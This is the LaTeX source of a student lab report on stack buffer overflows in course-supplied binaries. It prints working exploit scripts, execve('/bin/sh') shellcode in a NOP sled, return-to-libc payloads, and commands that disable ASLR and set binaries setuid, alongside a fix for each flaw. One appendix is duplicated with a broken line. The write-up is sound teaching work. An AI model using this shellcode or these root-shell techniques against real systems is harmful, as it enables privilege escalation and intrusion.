@@ -1,0 +1,850 @@
+\documentclass[english, a4paper, 11pt]{article}
+\usepackage{graphicx}
+\usepackage{float}
+\usepackage{microtype}
+\usepackage[T1]{fontenc}
+\usepackage[utf8]{inputenc}
+\usepackage{csquotes}
+\usepackage{babel}
+
+\usepackage[bookmarks=true,bookmarksnumbered]{hyperref}
+\hypersetup{
+	pdftitle={SSD - BOTTON Lab2},
+	pdfauthor={BOTTON David},
+	pdfkeywords={SSD, BO},
+	bookmarksnumbered,
+    breaklinks=true,
+    colorlinks=true,
+    linkcolor=blue,
+    citecolor=black,
+    urlcolor=blue,
+}
+\usepackage[most]{tcolorbox}
+
+\usepackage{lmodern}
+\usepackage{amsmath,amssymb,textcomp}
+\usepackage[style=ieee]{biblatex}
+
+
+\usepackage{booktabs,caption}
+
+
+\usepackage{tikz}
+\graphicspath{{figures/}}
+
+\usepackage{tocloft}
+\renewcommand{\cftsecleader}{\cftdotfill{\cftdotsep}}
+\renewcommand{\cftsecfont}{\bfseries\large}
+\renewcommand{\cftsecpagefont}{\bfseries\large}
+\cftsetindents{section}{1.5em}{3.5em}
+\setlength{\cftbeforesecskip}{8pt}
+
+\usepackage[
+headheight=16mm,
+     bottom=30mm,
+     top=15mm,
+     bottom=20mm,
+    includeheadfoot
+]{geometry}
+
+\usepackage[
+	per-mode=symbol,
+	separate-uncertainty=true,
+]{siunitx}
+
+\usepackage{booktabs}
+\usepackage{caption}
+\captionsetup[table]{skip=1ex}
+
+\usepackage{tikz}
+\usepackage{graphicx}
+\graphicspath{{figures/}}
+
+\usepackage{pgfgantt}
+
+\usepackage{cleveref}
+
+\usepackage{fancyhdr}
+\fancypagestyle{unicamp}{
+\renewcommand{\headrule}{}
+\renewcommand{\footrule}{}
+\fancyhead{}
+\fancyfoot{}
+\fancyhead[C]{\sffamily%
+{\bfseries\fontsize{15.5pt}{1em}\selectfont\uppercase{Haute École Bruxelles-Brabant}}\\
+\fontsize{11.3pt}{1.2em}\selectfont\uppercase{École Supérieure d'Informatique}\\
+\uppercase{Master of Cybersecurity \\ 2025-2026}}\\
+\fancyfoot[C]{\sffamily\fontsize{9pt}{1em}\selectfont%
+Rue Royale 67, 1000 Brussels, Belgium\\
+Tel: +32 2 219 15 46\\
+    }
+}
+
+\pagestyle{plain}
+
+\usepackage{setspace}
+
+\usepackage{listings}
+\usepackage{xcolor} 
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{codeblue}{rgb}{0,0,1}
+\definecolor{codebg}{rgb}{0.95,0.95,0.95}
+
+\lstset{
+  language=sh,
+  basicstyle=\ttfamily\small,
+  keywordstyle=\color{codeblue}\bfseries,
+  stringstyle=\color{codepurple},
+  commentstyle=\color{codegreen}\itshape,
+  identifierstyle=\color{black},
+  morekeywords={if,then,else,fi,for,do,done,while,until,case,esac,break,continue,return,exit,echo,sudo,chmod,gcc,python,angr,pwntools},
+  sensitive=false,
+  numbers=left,
+  numberstyle=\tiny\color{codegray},
+  stepnumber=1,
+  numbersep=5pt,
+  backgroundcolor=\color{codebg},
+  showspaces=false,
+  showstringspaces=false,
+  showtabs=false,
+  frame=single,
+  rulecolor=\color{black},
+  tabsize=2,
+  captionpos=b,
+  breaklines=true,
+  breakatwhitespace=false,
+  escapeinside={\%*}{*)},
+}
+\begin{document}
+
+\thispagestyle{unicamp}
+
+\begin{center}
+
+\null\vfill
+
+{\scshape\large Secure Software Design \& Web Security\par}
+{\scshape\large Lab \#2\par}
+
+\vskip 3\baselineskip
+
+{\LARGE\bfseries Buffer Overflow\par}
+
+\vskip 3\baselineskip
+
+Candidate:\\[1ex]
+{\large\bfseries 615056 BOTTON David\par}
+
+\vskip 3\baselineskip
+
+Advisor:\\[1ex]
+{\large\bfseries Pr. R. Absil\par}
+
+\end{center}
+\vfill
+\clearpage
+\pagenumbering{arabic}
+\pagestyle{fancy}
+\fancyhf{}
+\renewcommand{\headrulewidth}{0.4pt}
+\fancyfoot[C]{\thepage}
+\begingroup
+    \hypersetup{linkcolor=black}
+    \tableofcontents
+\endgroup
+\clearpage
+\pagenumbering{arabic}
+\pagestyle{fancy}
+\fancyhead[L]{\sffamily\small Lab 2 -- Buffer Overflow}
+\fancyhead[R]{\sffamily\small 615056 BOTTON David}
+\fancyfoot[C]{\thepage}
+\newpage
+
+\section{Secret String in \textit{secret-str}} \label{sec:q1}
+\indent The secret is statically embedded into the executable. Developers sometimes store connection strings, API endpoints or plaintext that way and forget to clean up later on. It makes data retrievable with basic tools like cat, grep or objdump. 
+
+Common methods to produce such artefacts include hard coding values and post-compilation patching with a hex editor. I extract human readable text from the binary using basic \hyperref[lst:A1_strings_command]{utility programs} and discover the \hyperref[fig:A1_secret_string]{secret string}. 
+
+\section{Stack Smashing Protection in a Code Snippet} \label{sec:q2}
+\indent \hyperref[lst:Q2_snippet]{Snippet} shows a stack canary mechanism using the guard and secret variables to detect buffer overflows by verifying the integrity of guard. This mechanism is functionally similar to the automatic stack canary that GCC inserts with the \textit{-fstack-protector} flag. It can be bypassed in two ways: 
+
+1. \texttt{Information Leak}: Exploiting another vulnerability in the program, such as a format string vulnerability to leak the value of the secret variable. Attacker can craft an input that correctly matches the canary value. Then overwrites the buffer up to the return address without triggering the guard, bypassing the stack smashing detection. 
+
+
+2. \texttt{Brute Forcing}: If the secret value is not sufficiently random or uses a predictable initialization. Attacker can repeatedly attempt guessing secret until the program does not detect stack smashing and bypasses the protection. This option is viable on 32 bit architecture because the stack has much less entropy.
+
+\section{Password Protection in \textit{check-pwd}} \label{sec:q3}
+\indent The \textit{check-pwd} binary has a stack buffer overflow vulnerability because of unsafe \textit{gets} at 0x8048495 ignoring input limits. Reading the \hyperref[fig:A3_dump]{assembly dump}, I observe that buffer starts at ebp-0x16 (offset 22 from ebp), flag at ebp-0xc (offset 12). The binary initializes the flag to zero, reads user input into the buffer via gets (which appends a null byte), compares the buffer to the hardcoded password "securesoftware" at 0x804861e using strcmp, sets the flag to 1 only on match ("Correct Password" if successful, "Wrong Password" otherwise), and grants access if the flag value is anything but zero (0x00).
+
+No canary according to its \hyperref[fig:A3_checksec]{checksec output} which facilitates its exploitation, NX (non-executable stack) actively blocks shellcode but won't matter here, no PIE means addresses remain static.
+
+\paragraph{Fix} Replace gets with \textit{fgets(buffer, sizeof(buffer), stdin)}, enable stack canaries, turn on ASLR, check \textit{strlen(input)} < \textit{sizeof(buffer)}.
+
+\paragraph{Exploit} Input longer than 10 bytes, as the 11th byte overwrites the flag's low byte at ebp-0xc, making the flag non-zero and granting access despite the strcmp failure printing "Wrong Password". A simple payload like 11 'A's sets the low byte to 0x41.
+
+\begin{lstlisting}[caption={Python Payload Q3}, label={lst:Q3_python_payload}]
+# Root privileges given
+python -c 'print("A"*11)' | ./check-passwd 
+# Wrong Password (flag zeroed)
+python -c 'print("A"*10 + "\x00\x00\x00\x00")' | ./check-passwd 
+\end{lstlisting}
+
+\paragraph{Key Assembly Lines}
+\begin{lstlisting}[caption={Key Assembly Lines Q3}, label={lst:Q3_assembly_lines}]
+    # Stack frame setup, allocating 32 bytes for locals
+8048479: 83 ec 20                  sub    esp,0x20
+
+    # Buffer at ebp-0x16, sized 12 bytes
+804848f: 8d 45 ea                  lea    eax,[ebp-0x16]
+
+    # Unsafe input via gets, no bounds check
+8048495: e8 d6 fe ff ff            call   8048370 <gets@plt>
+
+    # Hardcoded password "securesoftware" for comparison 
+804849f: b8 1e 86 04 08            mov    eax,0x804861e
+
+    # String compare over 15 bytes using repz cmpsb
+80484ad: f3 a6                     repz cmpsb ds:[esi],es:[edi]
+
+    # Conditional jump to success branch on match
+80484c0: 74 0e                     je     80484d0 <checkPwd+0x5c>
+
+    # Flag var init to 0 at ebp-0xc, set to 1 only on match 
+804847c: c7 45 f4 00 00 00 00      movl   $0x0,-0xc(%ebp) 
+80484f4: c7 45 f4 01 00 00 00      movl   $0x1,-0xc(%ebp)
+
+\end{lstlisting}
+
+    \begin{tcolorbox}[  
+        colback=red!5!white,  
+        colframe=red!75!black,  
+        title={\textbf{\textcolor{black}{Disclaimer}}},
+        fontupper=\small,  
+        sharp corners  
+    ]Solutions below are based on Ubuntu 12 32-bit.
+    
+    
+    I disable ASLR and grant setuid bit to binaries \hyperref[sec:q5]{Q5}, \hyperref[sec:q6]{Q6} and \hyperref[sec:q7]{Q7}. 
+        \begin{lstlisting}[label={lst:disclaimer}]
+sudo sysctl -w kernel.randomize_va_space=0
+sudo chmod 4755 ./root-me-1 ./root-me-2 ./root-me-3
+        \end{lstlisting}
+    \end{tcolorbox}  
+
+
+\section{Critical Function in \textit{check-pwd-crit}} \label{sec:q4}
+The \textit{check-pwd-crit} binary has a stack buffer overflow vulnerability due to the use of \textit{gets} at 0x8048495, which does not limit input size. From the disassembly, the buffer is allocated at ebp-0x16 (22 bytes from ebp), with a 10-byte effective buffer, pattern testing shows the return address at offset 26 from the buffer start. According to the \hyperref[fig:A4_checksec]{checksec output}, canary, fortify, NX, and PIE are all disabled, while RELRO is partial.
+
+
+\paragraph{Fix} Replace \textit{gets} with \textit{fgets(buffer, sizeof(buffer), stdin)} or \textit{scanf("\%s", buffer)} with size limits, enable stack canaries with \textit{-fstack-protector}, disable executable stack with \textit{-z noexecstack}, and enable ASLR.
+
+\paragraph{Exploit} I overwrote the return address of \textit{checkPwd} to point to \textit{criticalFunction} at 0x08048514. Using cyclic pattern \hyperref[fig:A4_overflow_crash]{crash} and \hyperref[fig:A4_pattern_analysis_strings]{analysis}, I determined the offset to EIP is 26 bytes. A \hyperref[lst:Q4_exploit_script]{python script} delivers a payload composed of 26 'A's followed by the little-endian packed address of criticalFunction (\textbackslash x14\textbackslash x85\textbackslash x04\textbackslash x08) via stdin. This redirects the return from \textit{checkPwd} to \textit{criticalFunction}.
+To ensure that the program returns gracefully to a valid libc function instead of whatever follows the critical function, I chain the address of \textit{exit(0)} (0xb7e4fbf0 here) right after. Allowing to print "Critical function" without crash, as shown in \hyperref[fig:A4_resolution]{the execution}. 
+
+\paragraph{GDB Analysis} To analyze the vulnerability, the following gdb manipulations were executed:
+\begin{lstlisting}[label={lst:Q4_gdb_commands}]
+info functions          # List functions
+disas main              # Calls checkPwd at 0x804852f
+disas checkPwd          # Vuln gets at 0x8048495
+                        # buffer at ebp-0x16
+disas criticalFunction  # Target at 0x8048514
+
+pattern_create 100 pattern 
+run < pattern           # Crash with SIGSEGV
+\end{lstlisting}
+
+At crash, registers show overflow:
+\begin{lstlisting}[label={lst:Q4_gdb_commands_bis}]
+info registers          # EIP: 0x41414441, EBP: 0x41284141
+pattern_offset $eip     # 26 to EIP
+pattern_offset $ebp     # 22 to EBP
+pattern_search          # Confirms offsets
+x/32wx $esp - 0x40      # Stack dump shows pattern overflow
+\end{lstlisting}
+
+Verifying the exploit by running the payload and stepping through redirection.
+\begin{lstlisting}[label={lst:Q4_gdb_commands_three}]
+break *0x8048513     # Before ret in checkPwd
+
+run < <(python -c 'import struct; crit_addr=0x08048514; print("A"*26 + struct.pack("<I", crit_addr))')
+
+context              # Overwritten return at ebp+4
+x/wx $ebp+4          # 0x08048514 (pre-ret)
+stepi                # EIP jumps to criticalFunction
+x/10i $eip           # Shows criticalFunction code
+continue             # Prints "Critical function", no segfault
+\end{lstlisting}
+
+\section{Root Access in the Set-UID Program \textit{root-me-1}} \label{sec:q5}
+\indent The \textit{root-me-1} binary has a stack buffer overflow vulnerability because of \textit{strcpy} at 0x804845d ignoring input limits. Reading the \hyperref[fig:A5_dump]{assembly dump}, I observe that buffer starts at ebp-0xd0 (offset 208 from ebp).
+No canary according to its \hyperref[fig:A5_checksec]{checksec output} which facilitates exploitation, NX disabled allows shellcode execution on stack, no PIE keeps addresses static.
+
+\paragraph{Fix} Replace strcpy with \textit{strncpy(buffer, str, sizeof(buffer))}, enable stack canaries, turn off executable stack with \textit{-z noexecstack}, enable ASLR.
+
+\paragraph{Exploit} I used the return-to-environment technique where a shellcode is placed in an environment variable called EGG to dodge the null byte problem in strcpy that would cut off the copy too early. I crafted a \hyperref[lst:Q5_exploit_script]{python script} that sets EGG with a bunch of 100 NOPs ahead of the 21 byte shellcode for \textit{execve("/bin/sh")}, figured out its address using gdb, and built a payload with 212 A's to smash the 208-byte buffer at ebp-0xd0 and overwrite the return address at ebp+4 with that EGG address (0xbfffff39 in my runs), which lets me jump right into the NOP sled and into the shellcode for spawning a root shell with euid=0, all without crashing as shown in \hyperref[fig:A5_exploitation]{that execution}.
+
+Disassembly revealed the buffer load at lea eax,[ebp-0xd0] and frame allocation via sub esp,0xe8, then runtime stack dumps in gdb confirmed the buffer base at 0xbffffb98, cyclic pattern crash gave the 212 byte offset to the return address so I know the payload's filler size and overwrite position. The \hyperref[lst:Q5_exploit_script]{python script} automates this by dynamically compiling a helper to fetch the EGG address, handling minor environment shifts like argv length variations that could offset the stack by a few bytes.
+
+\paragraph{GDB Analysis} To analyze the vulnerability, the following gdb manipulations were executed:
+\begin{lstlisting}[label={lst:Q5_gdb_commands}]
+show architecture
+disas main                      # Disassemble functions
+disas greet
+break main                      # Set breakpoint and run short
+run hello
+                                
+next                            # Step through main to greet call
+                                # Repeat until greet 0x8048495
+step                            # Enter greet
+context                         # Inspect stack frame
+info registers esp              # Entry ESP: 0xbffffc6c
+\end{lstlisting}
+
+Taking measurements of target function \textit{greet}, as per the \hyperref[fig:A5_greet]{gdb output}.
+\begin{lstlisting}[label={lst:Q5_gdb_commands_bis}]
+next                            # Go before strcpy 0x804845d
+
+info registers ebp              # Confirm buffer location
+p (char *)($ebp - 0xd0)         # Buffer: 0xbffffb98
+x/52wx $ebp - 0xd0 - 4          # View buffer area
+                                # Step over strcpy and verify copy
+next
+x/s $ebp - 0xd0                 # Shows copied input
+                                # Continue to exit
+continue
+                                # Cyclic pattern for offset
+pattern create 300 '/tmp/pattern'
+run $(cat /tmp/pattern)         # Crashes
+                                # At crash: Calculate offset
+info registers eip              # Overwritten EIP
+pattern offset $eip             # 212 to return address
+
+x/80wx $esp - 256               # Inspect overflow path
+x/wx $ebp                       # Saved EBP at offset 208
+x/wx $ebp+4                     # Return address at 212
+
+\end{lstlisting}
+
+Verifying the exploit by setting EGG and stepping through shellcode execution.
+\begin{lstlisting}[label={lst:Q5_gdb_commands_three}]
+
+                                # Set EGG and get address
+set environment EGG \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+print getenv("EGG")
+break *0x804847a                # Before ret
+run $(python -c 'import struct; egg_addr=0xbfffff39; print("A"*212 + struct.pack("<I", egg_addr))')
+context                         # Verify stack[0] = EGG addr
+x/wx $ebp+4                     # Show EGG addr (pre-ret)
+stepi                           # EIP at EGG
+x/30i $eip                      # nops then xor eax,eax etc.
+continue                        # shell
+
+
+\end{lstlisting}
+
+\section{Root Access in the Set-UID Program \textit{root-me-2}} \label{sec:q6}
+\indent The \textit{root-me-2} binary has a stack buffer overflow vulnerability because of \textit{strcpy} ignoring input limits, similar to \textit{root-me-1}. From the cyclic  \hyperref[fig:A6_pattern_analysis_libc]{pattern analysis} in gdb, the offset to the return address is 212 bytes, implying the buffer is at ebp-0xd0. According to its \hyperref[fig:A6_checksec]{checksec output}, there is no canary, PIE is disabled, but NX is enabled, which prevents direct shellcode execution on the stack.
+
+
+\paragraph{Fix} Replace strcpy with \textit{strncpy(buffer, str, sizeof(buffer))}, enable stack canaries, turn on NX, enable ASLR.
+
+
+\paragraph{Exploit} I used a return-to-libc technique to bypass the non-executable stack. This involves overwriting the return address to point to the \textit{system()} function in libc, which executes \texttt{/bin/sh} as its argument, spawning a root shell. A fake return address (pointing to \textit{exit()}) follows \textit{system()} to ensure clean termination, and then the address of the \texttt{/bin/sh} string in libc. I extracted the libc base address (0xb7e1d000) from GDB's process mappings and added standard offsets for glibc 2.15 on i386: 0x3f0b0 for \textit{system()}, 0x32be0 for \textit{exit()}, and 0x1638a0 for \texttt{/bin/sh}. The \hyperref[lst:Q6_exploit_script]{python script} builds a payload with 212 'A's followed by these packed addresses, launches the binary as a subprocess, and communicates to trigger the overflow. This gains a root shell with euid=0 without crashing, as shown in \hyperref[fig:A6_resolution]{that execution}.
+
+\paragraph{GDB Analysis} To analyze the vulnerability, the following gdb manipulations were executed:
+\begin{lstlisting}[label={lst:Q6_gdb_commands}]
+pattern create 300 '/tmp/pattern'  # Generate cyclic pattern
+run $(cat /tmp/pattern)            # Run with pattern, crash on overflow
+info registers eip                 # Overwritten EIP: 0x25412425
+pattern offset 0x25412425          # Offset: 212 to return address
+info proc mappings                 # Extract libc base: 0xb7e1d000
+p system                           # Get addresses
+p exit                              
+\end{lstlisting}
+
+Verifying the exploit by inspecting registers and stack at crash.
+\begin{lstlisting}[label={lst:Q6_gdb_commands_bis}]
+context                            # EBP 0x41422541 ESP pattern
+x/30wx $esp                        # Confirm stack overflow
+\end{lstlisting}
+
+
+\section{Root Access in the Set-UID Program \textit{root-me-3}} \label{sec:q7}
+The \textit{root-me-3} binary has a stack buffer overflow vulnerability because of \textit{strcpy} at 0x8048531 ignoring input limits. Observing \hyperref[fig:A7_main_greet]{disassemblies}, I see the buffer starts at ebp-0xd0 (offset 208 from ebp). According to the \hyperref[fig:A7_checksec]{checksec output} there is no canaries, NX disabled, no PIE.
+
+
+\paragraph{Fix} Replace strcpy with \textit{strncpy(buffer, str, sizeof(buffer))}, enable stack canaries, turn off executable stack with \textit{-z noexecstack}, enable ASLR. The early privilege drop is a good countermeasure against escalation.
+
+\paragraph{Exploit} While a buffer overflow is possible, privilege escalation to root is not achievable. Listing GDB's \hyperref[fig:A7_disas]{symbol lists}, my attention was drawned to the \hyperref[fig:A7_debug_mode]{debug\_mode function}. Called at the start of main with argument 0, it drops privileges by setting both real and effective UIDs to the user's ID (0x3e8 or 1000) via setreuid before the vulnerable greet function. This drop means any exploited shell from the overflow runs as user, not root. From the \hyperref[fig:A7_pattern_analysis]{pattern analysis}, the offset to the return address is 212 bytes, similar to previous binaries, but post-drop UIDs prevent privilege escalation.
+
+I calculate the \hyperref[fig:A7_gdb_payload1]{buffer address} and confirm the stack layout. Then I observe \hyperref[fig:A7_gdb_payload2]{segmentation fault} in GDB after overwriting the return address. I craft a \hyperref[lst:Q7_exploit_script]{python payload} to fill the buffer with junk up to the offset, followed by the return address pointing to a NOP sled and the shellcode, the payload was tailored to jump directly into the executable code on the stack. Finally, \hyperref[fig:A7_resolution]{that execution} demonstrates successful overflow opening a shell without crashing. As mentioned earlier, privilege escalation is prevented by \textit{debug\_mode}.
+
+\paragraph{GDB Analysis} To analyze the vulnerability and privilege drop, the following gdb manipulations were executed:
+\begin{lstlisting}[label={lst:Q7_gdb_commands},language=sh]
+disas                           # List all symbols
+disas main                      # Disassemble functions
+disas greet
+disas debug_mode                # Inspect privilege drop logic
+pattern create 300              # Generate cyclic pattern
+run 'AAA...%6A%'                # Run with pattern, overflowing
+pattern offset $eip             # Offset: 212 to return address
+info registers ebp              # Overwritten EBP
+info registers eip              # Overwritten EIP
+x/32wx $esp - 0x40              # Inspect overflowed stack
+\end{lstlisting}
+
+Verifying UIDs at main entry.
+\begin{lstlisting}[label={lst:Q7_gdb_commands_bis},language=sh]
+break main                      # Set breakpoint
+run David                       # Run to main
+print (int)geteuid()            # Effective UID: 0x3e8 (dropped)
+\end{lstlisting}
+
+Tracing through debug\_mode for drop confirmation.
+\begin{lstlisting}[label={lst:Q7_gdb_commands_three},language=sh]
+break debug_mode                # Break at debug_mode
+continue                        # Reach debug_mode
+next                            # Step to first getuid
+next                            # After first getuid
+print $eax                      # First getuid: 0x3e8
+next                            # After store, to second getuid
+next                            # After second getuid
+print $eax                      # Second getuid: 0x3e8
+\end{lstlisting}
+
+The \hyperref[fig:A7_break_main]{breakpoint at main} confirms the initial state before any calls. The \hyperref[fig:A7_print_getuid]{getuid print} and \hyperref[fig:A7_print_geteuid]{geteuid print} show both UIDs as 1000 (0x3e8). The \hyperref[fig:A7_break_debug]{breakpoint at debug\_mode} allows stepping through the function. The first \hyperref[fig:A7_print_eax]{eax print after getuid} and second \hyperref[fig:A7_print_eax2]{eax print after getuid} confirm both calls return the real UID (1000), which are then used in setreuid(1000, 1000) to irrevocably drop privileges. This early drop ensures the buffer overflow in greet cannot escalate to root.
+
+\appendix
+\addtocontents{toc}{\protect\vspace{10pt}\noindent\hrulefill\par\vspace{10pt}}
+\clearpage
+\renewcommand{\headrulewidth}{0.4pt}  
+\renewcommand{\footrulewidth}{0pt} 
+\section{A1 Material for \textit{secret-str}} \label{annex:q1}
+\fancyfoot[C]{\hyperref[sec:q1]{Back to Q1}}
+
+\begin{lstlisting}[caption={Command Solving Q1}, label={lst:A1_strings_command}]
+strings secret-str | grep -i secret
+\end{lstlisting}
+\begin{figure}[H]
+\centering
+    \includegraphics[width=1\linewidth]{figures/A1_strings_output.png}
+    \caption{Secret String Q1}
+    \label{fig:A1_secret_string}
+\end{figure}
+
+\clearpage
+
+\section{A2 Material for Stack Protection} \label{annex:q3}
+\fancyfoot[C]{\hyperref[sec:q2]{Back to Q2}}
+
+
+
+\begin{lstlisting}[caption={C Code Snippet Q2}, label={lst:Q2_snippet}]
+int secret; // will be initialised with a random number in the main function
+
+void stuff(char* str)
+{
+    int guard = secret;
+
+    char buffer[12];
+
+    strcpy(buffer, str);
+
+    if(guard != secret)
+    {
+        printf("Stack_smashing_detected._Terminating_program.\n");
+        exit(1);
+    }
+}
+\end{lstlisting}
+\clearpage
+
+
+
+\section{A3 Material for \textit{check-passwd}} \label{annex:q3}
+\fancyfoot[C]{\hyperref[sec:q3]{Back to Q3}}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{A3_checksec.png}
+    \caption{Checksec \textit{check-passwd} Q3}
+    \label{fig:A3_checksec}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\linewidth]{figures/A3_dump.png}
+    \caption{Disassembly \textit{check-passwd} Q3}  
+    \label{fig:A3_dump}
+\end{figure}
+
+\clearpage
+
+
+
+
+
+
+
+\section{A4 Material for check-passwd-crit} \label{annex:q4}
+
+
+\fancyfoot[C]{\hyperref[sec:q4]{Back to Q4}}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{figures/A4_checksec.png}
+    \caption{Checksec \texttt{check-passwd-crit} Q4}
+    \label{fig:A4_checksec}
+\end{figure}
+
+\fancyfoot[C]{\hyperref[sec:q4]{Back to Q4}}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.7\linewidth]{figures/A4_overflow_crash.png}
+    \caption{Observing \texttt{check-passwd-crit} Crash Q4}
+    \label{fig:A4_overflow_crash}
+\end{figure}
+\fancyfoot[C]{\hyperref[sec:q4]{Back to Q4}}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\linewidth]{figures/A4_pattern_analysis_strings.png}
+    \caption{Pattern Analysis Q4}
+    \label{fig:A4_pattern_analysis_strings}
+\end{figure}
+
+\begin{lstlisting}[caption={Solver Script Q4}, label={lst:Q4_exploit_script}]
+import sys
+critical_addr = 0x08048514
+exit_addr = 0xb7e4fbf0
+payload = b"A" * 26
+payload += critical_addr.to_bytes(4, "little")
+payload += exit_addr.to_bytes(4, "little")
+sys.stdout.buffer.write(payload)
+\end{lstlisting}
+
+
+\fancyfoot[C]{\hyperref[sec:q4]{Back to Q4}}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{figures/A4_resolution.png}
+    \caption{Solving \texttt{check-passwd-crit} Q4}
+    \label{fig:A4_resolution}
+\end{figure}
+\clearpage
+
+
+
+
+
+
+
+\section{A5 Material for \textit{root-me-1}} \label{annex:q5}
+\fancyfoot[C]{\hyperref[sec:q5]{Back to Q5}}
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{figures/A5_checksec.png}
+    \caption{Checksec \texttt{root-me-1} Q5}
+    \label{fig:A5_checksec}
+\end{figure}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{figures/A5_greet_strcpy.png}
+    \caption{Found Unsafe \textit{strcpy} Function Q5}
+    \label{fig:A5_greet}
+\end{figure}
+
+
+\begin{lstlisting}[caption={Solver Script Q5}, label={lst:Q5_exploit_script}]
+#!/usr/bin/env python2
+import struct
+import os
+
+# var env execve("/bin/sh")
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+os.environ['EGG'] = '\x90' * 100 + shellcode
+
+# getaddr
+os.system('gcc -m32 -o /tmp/getaddr -x c - << EOF\n#include <stdio.h>\n#include <stdlib.h>\nint main() { printf("%p\\n", getenv("EGG")); }\nEOF')
+
+# dummy arg length of payload
+offset = 212
+dummy = 'A' * (offset + 4)
+addr_str = os.popen('/tmp/getaddr "{}"'.format(dummy)).read().strip()
+print("EGG address: " + addr_str)
+
+egg_addr = int(addr_str, 16)
+
+# build payload (start of NOPs)
+payload = "A" * offset + struct.pack("<I", egg_addr)
+
+print("Running exploit...")
+os.system('./root-me-1 "' + payload + '"')
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{figures/A5_exploit_success.png}
+    \caption{Exploiting \textit{root-me-1} Q5}
+    \label{fig:A5_exploitation}
+\end{figure}
+
+\fancyfoot[C]{\hyperref[sec:q5]{Back to Q5}}
+
+
+
+
+\clearpage
+\section{A6 Material for \textit{root-me-2}}
+\label{annex:q6}
+\fancyfoot[C]{\hyperref[sec:q6]{Back to Q6}}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A6_checksec.png}
+\caption{Checksec \texttt{root-me-2} Q6}
+\label{fig:A6_checksec}
+\end{figure}
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A6_pattern_analysis_libc.png}
+\caption{Pattern Analysis \textit{root-me-2} Q5}
+\label{fig:A6_pattern_analysis_libc}
+\end{figure}
+
+\begin{lstlisting}[caption={Solver Script Q6}, label={lst:Q6_exploit_script}]
+import struct
+import subprocess
+
+# Libc base address
+libc_base = 0xb7e1d000
+
+#Offsets for glibc 2.15 i386
+system_offset = 0x3f0b0
+exit_offset = 0x32be0
+binsh_offset = 0x1638a0
+
+system = libc_base + system_offset
+exit_addr = libc_base + exit_offset
+binsh = libc_base + binsh_offset
+
+offset = 212
+junk = b"A" * offset
+
+#Payload: junk + system + exit + binsh
+payload = junk + struct.pack("<I", system) + struct.pack("<I", exit_addr) + struct.pack("<I", binsh)
+
+
+p = subprocess.Popen(["./root-me-2", payload])
+p.communicate()
+\end{lstlisting}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=1\linewidth]{figures/A6_resolution.png}
+    \caption{Exploiting \textit{root-me-2} Q6}
+    \label{fig:A6_resolution}
+\end{figure}
+
+
+\clearpage
+\clearpage
+\section{A6 Material for \textit{root-me-2}}
+\label{annex:q6}
+\fancyfoot[C]{\hyperref[sec:q6]{Back to Q6}}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A6_checksec.png}
+\caption{Checksec \texttt{root-me-2} Q6}
+\label{fig:A6_checksec}
+\end{figure}
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A6_pattern_analysis_libc.png}
+\caption{Pattern Analysis \textit{root-me-2} Q5}
+\label{fig:A6_pattern_analysis_libc}
+\end{figure}
+
+\begin{lstlisting}[caption={Solver Script Q6}, label={lst:Q6_exploit_script}]
+import struct
+import subprocess
+Libc base address
+
+libc_base = 0xb7e1d000
+
+#Offsets for glibc 2.15 i386
+system_offset = 0x3f0b0
+exit_offset = 0x32be0
+binsh_offset = 0x1638a0
+
+system = libc_base + system_offset
+exit_addr = libc_base + exit_offset
+binsh = libc_base + binsh_offset
+
+offset = 212
+junk = b"A" * offset
+
+#Payload: junk + system + exit + binsh
+payload = junk + struct.pack("<I", system) + struct.pack("<I", exit_addr) + struct.pack("<I", binsh)
+
+p = subprocess.Popen(["./root-me-2", payload])
+p.communicate()
+\end{lstlisting}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A6_resolution.png}
+\caption{Exploiting \textit{root-me-2} Q6}
+\label{fig:A6_resolution}
+\end{figure}
+
+\clearpage
+
+
+
+
+
+\section{A7 Material for \textit{root-me-3}} \label{annex:q7}
+\fancyfoot[C]{\hyperref[sec:q7]{Back to Q7}}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_checksec.png}
+\caption{Checksec \textit{root-me-3} Q7}
+\label{fig:A7_checksec}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_disas.png}
+\caption{Symbols List \textit{root-me-3} Q7}
+\label{fig:A7_disas}
+\end{figure}
+
+
+
+\begin{figure}[H]
+\centering
+\includegraphics[width=1\linewidth]{figures/A7_main_greet.png}
+\caption{Disassembly main and greet Q7}
